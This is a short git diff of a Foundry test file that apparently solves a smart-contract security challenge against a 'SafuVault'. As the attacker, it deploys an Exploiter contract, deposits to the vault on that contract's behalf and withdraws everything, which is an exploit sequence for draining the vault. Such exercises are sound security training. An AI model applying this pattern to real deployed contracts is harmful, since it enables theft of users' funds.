@@ -8,6 +8,7 @@ import {console} from "forge-std/console.sol";
 import {Token} from "src/other/Token.sol";
 import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
 import {SafuVault,IStrategy} from "src/safu-vault/SafuVault.sol";
+import {Exploiter} from "src/safu-vault/Exploiter.sol";
 
 
 contract Testing is Test {
@@ -66,6 +67,12 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+
+        Exploiter exploiter = new Exploiter(attacker, 4);
+        usdc.approve(address(exploiter), 10_000e18);
+        safuVault.depositFor(address(exploiter), 10_000e18, attacker);
+
+        safuVault.withdrawAll();
 
         vm.stopPrank();
         validation();
